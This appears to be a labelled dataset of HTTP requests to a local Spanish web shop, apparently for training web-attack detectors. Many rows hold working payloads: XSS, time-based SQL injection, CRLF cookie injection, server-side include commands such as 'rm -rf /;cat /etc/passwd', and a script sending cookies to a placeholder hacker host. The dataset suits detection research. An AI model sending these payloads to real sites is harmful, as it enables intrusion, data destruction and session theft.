GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=oyama&pwd=chiapa&remember=on&B1=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39%2F&cantidad=67&B1=A%F1adir+al+carrito HTTP/1.1,,0
GET http://localhost:8080/IISSamples/sdk/asp/docs/CodeBrws.asp HTTP/1.1,,0
GET http://localhost:8080.inc HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,errorMsgA=Credenciales+incorrectas,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=2%2F&nombre=Queso+Manchego&precio=100&cantidad=78&B1=A%F1adir+al+carrito,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,id=%2500,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bernarr&password=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&nombre=Uriel&apellidos=Cloquell+Pesarrodona&email=moorehead-hamlett%40touringa.pw&dni=64688843D&direccion=Pl.+La+Merced%2C+107+4C&ciudad=Cuarte+de+Huerva&cp=19420&provincia=Teruel&ntc=4593991243170323&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=ploof&password=p04u803&nombre=Alenda&apellidos=Pruneda+De+Velasco&email=caron%40nexuspark.ai&dni=50020791T&direccion=Carretera+Lebrija%2C+25+&ciudad=Santo+Tom%E9+del+Puerto&cp=42126&provincia=C%E1ceres&ntc=7582936564650481&B1A=Registrar,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,id=2bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=ehab&password=pio58241&nombre=Vanina&apellidos=Metauten+Suau&email=eiler-philpelli%40cpanelweb.com.af&dni=82384047W&direccion=San+Jose+139%2C+13E&ciudad=Plasenzuela&cp=45200&provincia=Salamanca&ntc=6014129235774839&B1=Registrarany%250ASet-cookie%253A%2BTamper%253D1041264011025374727,0
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,modo=insertar&precioA=6457&B1=Pasar+por+caja,0
GET http://localhost:8080/tienda1/publico/asf-logo-wide.Old HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp.java HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=01423&provincia=Barcelona%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ntc=5124736256894307&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=thege&password=abstruso&nombre=Guida&apellidos=Lambarri&email=mcclellan.truex%40faders.com.cl&dni=62140654J&direccion=Txapitela%2C+183+13%3FG&ciudad=Sant+Feliu+Sasserra&cpA=04569&provincia=Toledo&ntc=1284694854341650&B1=Registrar,0
GET http://localhost:8080/admin.nsf HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros/6909030637832563290.jsp HTTP/1.1,,0
GET http://localhost:8080/tienda1/6909030637832563290.jsp~ HTTP/1.1,,0
GET http://localhost:8080/tienda1/imagenes/1.gif/4861362529278789730~ HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wei&password=presEn%2C%2F%2CcIaR&nombre=Estefan&apellidos=Tomasa+Camino&email=bovell_haygarth%40nuestrasantacruz.vu&dni=75996092K&direccion=Guadiana+S%2FN+2%3FC&ciudad=Ossa+de+Montiel&cp=08470&provincia=Badajoz&ntc=4288323841686638&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,modo=entrar&login=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=6r6s1arr%E17&remember=on&B1=Entrar,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,idA=1,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cimino&password=tarifa&nombre=Armengol&apellidos=Zurera+Boixadra&email=gamblers-gates9%40showeb-handling.sg&dni=39315831E&direccion=C%2F+Aires+De+La+Mar%2C+6+&ciudad=Alb%E1nchez&cp=09441&provincia=%2B&ntc=2965845845269028&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,B2=Set-cookie%253A%2BTamper%253D1041264011025374727,0
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27INJECTED_PARAM HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,modo=entrar&loginA=dealto&pwd=al*hoRrE&remember=off&B1=Entrar,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=1&nombre=Queso+Manchego&precio=39%2F&cantidad=46&B1=A%F1adir+al+carrito,0
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,errorMsg=Credenciales+incorrectas%22+AND+%221%22%3D%221,0
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp/4861362529278789730 HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%2520 HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=2&nombre=Queso+Manchego&precio=85&cantidad=37&B1=A%F1adir+al+carritoany%250ASet-cookie%253A%2BTamper%253D1041264011025374727,0
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,modo=entrar&login=herbie&pwd=%2Cc1%2CudA%2FD738&remember=on&B1=Entrar,0
GET http://localhost:8080/tienda1/global/titulo.jsp/asf-logo-wide.gif/.BAK HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=messier&password=c7b183o&nombre=Nicodemo&apellidos=Nog*ueira+Aguayo&email=galloway%40rtce.gu&dni=35507822P&direccion=Numero+15%2C+151%2C+&ciudad=Castrillo+de+la+Guare%F1a&cp=23657&provincia=Toledo&ntc=1278501676319264&B1=Registrar,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=thatcher7&password=CeSt%D3N&nombre=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&apellidos=Narva&email=funchess%40lamarsrl.gy&dni=94853539K&direccion=Luis+Doreste+Silva+S%2FN+6%3FD&ciudad=Salares&cp=15910&provincia=%C1vila&ntc=5040261965189529&B1=Registrar,0
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%2520 HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=manek&password=di3gu6ta7a5e3t5&nombre=Oberto&apellidos=Mansur+Morales&email=laval_koldehoff%40nutrimama.sb&dni=73525509Y&direccion=Alarona%2C+52+&ciudad=San+Garc%EDa+de+Ingelmos%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=26375&provincia=Soria&ntc=8551810827750150&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=keene-mo&password=DEs2l0bear&nombre=Florio&apellidos=Alcalde+Rybensky&email=bobenko-steimaroua%40926.lb&dni=65834957X&direccion=C%2F+Leganes%2C+74+bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&ciudad=Sant+Miquel+de+Campmajor&cp=42138&provincia=Huesca&ntc=7967092459392219&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/_cti_pvt/linkinfo.cnf HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/pagar.jsp/asf-logo-wide.INC HTTP/1.1,,0
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=jock&password=exorcismo&nombre=Modesto&apellidos=Oms+Berdasquera&email=banas_chwalibog%40soybueno.st&dniA=33293484H&direccion=C%2F+Reina%2C+132+4G&ciudad=Cevico+Navero&cp=50294&provincia=Salamanca&ntc=3614479756517146&B1=Registrar,0
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg/6909030637832563290.jsp HTTP/1.1,,0
GET http://localhost:8080/tienda1/global/creditos.jsp/ HTTP/1.1,,0
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=gib&password=3L29stRE&nombre=Yarav%ED&apellidos=Pa%F1ella+Villasev&email=switzer%40grandesinventos.pt&dni=04831932T&direccion=C%2F+Rio+San+Lorenzo%2C+125%2C+10%3FC&ciudad=Alegr%EDa-Dulantzi&cp=34170&provincia=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&ntc=3029147558638309&B1=Registrar,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=emerson&password=imperialistA&nombre=Nevnka&apellidos=Eraso+Rebes&email=cooper%40telelujo.coop&dni=93314361A&direccionA=Plaza+Morquera+S%2FN+&ciudad=Graja+de+Campalbo&cp=49638&provincia=Almer%EDa&ntc=1918567555669782&B1=Registrar,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp/4861362529278789730 HTTP/1.1,,0
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=gib&password=2%2Cu%2F%2F4ro08&nombre=Yarav%ED&apellidos=Pa%F1ella+Villasev&email=switzer%40grandesinventos.pt&dni=04831932T&direccion=C%2F+Rio+San+Lorenzo%2C+125%2C+10%3FC&ciudad=Alegr%EDa-Dulantzi&cp=34170&provincia=Zamora&ntc=3029147558638309&B1=Registrar,0
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=marceau&password=galLofaR&nombre=Reese&apellidos=Echevarr%EDa+Borras&emailA=shafer%40comodindelhogar.ps&dni=91669228Z&direccion=Calle+Ciudad+Real+70+&ciudad=Pinilla+de+Toro&cp=18110&provincia=Le%F3n&ntc=5498019386579273&B1=Registrar,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,idA=2,0
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,modo=entrar&login=AND+1%3D1&pwd=815ja4&remember=on&B1=Entrar,0
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1980&B1=Confirmar%2F HTTP/1.1,,0
GET http://localhost:8080/tienda1/global/estilos.css/4861362529278789730 HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4981&B1=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=2&nombre=Jam%F3n+Ib%E9rico%2500&precio=100&cantidad=41&B1=A%F1adir+al+carrito,0
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,modo=insertar&precio=5035&B1=Pasar+por+cajaany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=%7C&login=denna&password=89S0R56Gl8&nombre=Reynard&apellidos=H%E9rard&email=bardy%40busquedadeempleo.mw&dni=18720571C&direccion=Ordo%F1ez+31%2C+4%3FG&ciudad=Vinuesa&cp=50584&provincia=Zaragoza&ntc=0820484159407817&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg.BAK HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=shimiz&password=M5x0E&nombre=Nimsi&apellidos=Cat%E0+Viera&email=talbot_polani%40clichotel.sj&dni=56967582D&direccion=Avenida+Industria+48%2C+12H&ciudad=Sant+Mart%ED+de+Riucorb&cp=44124&provinciaA=Zaragoza&ntc=5246598463194503&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,errorMsg=Credenciales+incorrectasany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,0
GET http://localhost:8080/tienda1/miembros/fotos.jsp/asf-logo-wide.gif/.BAK HTTP/1.1,,0
GET http://localhost:8080/tienda1/6909030637832563290.jsp~ HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&precio=898&B1=Confirmar HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg/.old HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kolenda&pwd=0%DA7e1&remember=off&B1A=Entrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=rubenste&password=repajo&nombre=Exequiel&apellidos=Di+Giorgi+Kohls&email=kagan%40infotek.np&dni=32194904X&direccion=Extrarradio+Poligono+Industrial+Comarca+1+67%2C+12F&ciudad=Entrambasaguas&cp=3777A&provincia=%C1vila&ntc=5141976023395165&B1=Registrar,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cirulli&password=exployada&nombre=Nadini&apellidos=Crusell%2Bes.+M*arcelin&email=hell.nomura%40velazquezlarra%F1aga.am&dni=61186493F&direccion=C%2F+Rafael+Company+%22farmaceutic%22%2C+135%2C+&ciudad=Salas+Altas&cp=01039&provincia=Guadalajara&ntc=9812245040414546&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/imagenes/3.gif.Inc HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/anadir.jsp/.OLD HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mo%2Brson&password=c44dE96&nombre=Orestes&apellidos=Amargant&email=el2%40campanasextractoras.py&dni=57728968A&direccion=Calle+Salado%2C+148%2C+6%3FF&ciudad=Valderrobres&cp=16236&provincia=Girona&ntc=1272142225716686&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/global/4861362529278789730 HTTP/1.1,,0
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=%22+AND+%221%22%3D%221&provincia=Barcelona&ntc=5124736256894307&B1=Registrar,0
GET http://localhost:8080/iissamples/dfault/samples.asp HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/anadir.jsp?idA=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=90&B1=A%F1adir+al+carrito HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,errorMsgA=Credenciales+incorrectas,0
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,modo=insertar&precio=5029&B1=%4040,0
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=2&nombre=Queso+Manchego&precio=85&cantidadA=12&B1=A%F1adir+al+carrito,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,id=1%27INJECTED_PARAM,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alix&password=venI%21A&nombreA=Imelda&apellidos=Delb%F3n+Coll&email=holister%40brunoseguridad.cf&dni=80525673M&direccion=Plza.+Noria+De+La+Huerta+68%2C+&ciudad=Alcudia+de+Veo&cp=28690&provincia=%C1vila&ntc=6551003767368321&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,0
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1,,0
GET http://localhost:8080/CFIDE/administrator/welcome.cfm HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=%253F&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=35&B1=A%F1adir+al+carrito HTTP/1.1,,0
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=manek&password=di3gu6ta7a5e3t5&nombre=Oberto&apellidos=Mansur+Morales&email=ba%40rbe%40r%40a2hotels.%40sd&dni=73525509Y&direccion=Alarona%2C+52+&ciudad=San+Garc%EDa+de+Ingelmos&cp=26375&provincia=Soria&ntc=8551810827750150&B1=Registrar,0
GET http://localhost:8080/tienda1/index.jsp/asf-logo-wide.gif HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,B2A=Vaciar+carrito,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=craig-du&password=8rre0dad7ra&nombre=Octavia&apellidos=Yaben+Billini&email=formichi%40nevadahispanica.pt&dni=09082221G&direccion=Avinguda+Gatassa+S%2FN+5Aany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&ciudad=Olmedillo+de+Roa&cp=39255&provincia=Ourense&ntc=9946991800186707&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=ramos&password=imperceptiblemenTE&nombre=Albana&apellidos=Giorgis+Zabala&email=mobley_bonn%40delujos.cv&dni=76097661E&direccion=Calle+12+56+&ciudad=Majaelrayo&cp=48220&provincia=Vizcaya&ntc=805212306238877&B1=Registrar,0
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,modo=entrar&login=tomohiro&pwd=cacoquimia&remember=off&B1=Entrarsessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=angeline0%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&password=tasajo&nombre=Anatal%F3n&apellidos=Gironell+Nurnberg&email=alari-clayton%40blueeyes.mm&dni=02864580E&direccion=C%2F+Pescadores+De+Terranova%2C+108%2C+9-E&ciudad=Gironella&cp=34309&provincia=Lleida&ntc=1940469779787284&B1=Registrar,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=van_bent&password=t13si2ura&nombre=VahidReza&apellidos=Gilabert&email=dressler%40sanchezquesada.my&dni=91520697V&direccion=C%2F+Gandia+89%2C+5%3FD&ciudad=P%F3veda+de+Soria%2C+La&cp=50521&provincia=Ourense&ntc=243252281713196&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=7767&B1=Confirmar HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mayi&password=r75ar&nombre=Alenka&apellidosA=Cejas+Torra&email=kobe%40techdata.com.pg&dni=75925253E&direccion=Calle+Casas+Viejas+73+&ciudad=Torres+de+Cotillas%2C+Las&cp=08731&provincia=Navarra&ntc=1803474685764017&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=2&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=100&cantidad=90&B1=A%F1adir+al+carrito,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=adornato&password=politiquer%EDa&nombre=Fedelia&apellidos=Ollero+Sogorb&email=pina.diarra%40annoyanc.zm&dni=43658270S&direccion=C%2F+Guincho%2C+191%2C+7%3FF&ciudad=Abezames&cpA=12230&provincia=La+Rioja&ntc=4001707460771803&B1=Registrar,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=jakabffy&password=33aRr179&nombre=VahidReza&apellidos=Curell+Lagares&email=moura%40chicasdiabolo.iq&dni=75130756Z&direccion=Urbanizacion+Montesion%2C+3+&ciudad=Molinaseca&cp=45180&provincia=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&ntc=2571648203429012&B1=Registrar,0
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,modo=insertar&precio=7144&B1=Confirmar%2F,0
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg.bak HTTP/1.1,,0
GET http://localhost:8080/tienda1/6909030637832563290.jsp HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,,0
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=3&nombre=Queso+Manchego&precio=100&cantidad=52%27INJECTED_PARAM&B1=A%F1adir+al+carrito,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=grz%3F%2Fegore*3&password=freno&nombre=Raifroid&apellidos=Sol%E1+Portillo&email=nererova%40camilafansite.by&dni=41955080K&direccion=C%2F+Fusta+40+11-F&ciudad=San+Pablo+de+los+Montes&cp=49333&provincia=Burgos&ntc=5510588122545598&B1=Registrar,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=honda&passwordA=d.o4a56%F3n&nombre=Josua&apellidos=Negrete&email=haworth%40rockefeller.uk&dni=32230670B&direccion=Calle+Pura+e+Dora+Vazquez+12%2C+7D&ciudad=Padul&cp=19307&provincia=Almer%EDa&ntc=9549023942251189&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros/4861362529278789730 HTTP/1.1,,0
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg/.Inc HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,modo=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=8137&B1=Pasar+por+caja,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=cash3&password=desfacci%F3n&nombre=Eraldo&apellidos=Varela+Pulido&email=salminen_chew%40suardistec.tw&dni=16864786J&direccion=C%2F+Chalaneros%2C+188%2C+12-E&ciudad=Junta+de+Villalba+de+Losa&cp=08787&provincia=N%3Fava*rra&ntc=4545565224454291&B1=Registrar,0
GET http://localhost:8080/tienda1/publico/productos.jsp/6909030637832563290.jsp HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,errorMsgA=Credenciales+incorrectas,0
GET http://localhost:8080/tienda1/asf-logo-wide.gif.inc HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,errorMsgA=Credenciales+incorrectas,0
GET http://localhost:8080.Inc HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=roig&password=a4ev1l19&nombre=Ra%FAl&apellidosA=Esterric+Bou&email=munshin%40cirugiaplasticacordoba.hk&dni=42473286Z&direccion=Avda.+Sanlucar+De+Barrameda+78+5-B&ciudad=Alcaraz&cp=40291&provincia=Huesca&ntc=4538972829961563&B1=Registrar,0
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,modo=insertar&precio=3471&B1=%22+AND+%221%22%3D%221,0
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,modo=entrar&login=wep%2Ff&pwd=e4pe5imenta2a&remember=on&B1=Entrar,0
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombreA=Vino+Rioja&precio=85&cantidad=73&B1=A%F1adir+al+carrito HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,modo=insertar&precio=6771&B1=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,0
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27OR%27a%3D%27a HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=van_bent&password=t13si2ura&nombre=VahidReza&apellidos=Gilabert&email=dressler%40sanchezquesada.my&dni=91520697V&direccion=C%2F+Gandia+89%2C+5%3FD&ciudad=P%F3veda+de+Soria%2C+La&cp=50521%7C&provincia=Ourense&ntc=2971846530842782&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,modo=entrar&login=dovel&pwd=theresa&remember=offany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Entrar,0
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%4040 HTTP/1.1,,0
GET http://localhost:8080/names.nsf HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,id=2%27+AND+%271%27%3D%271,0
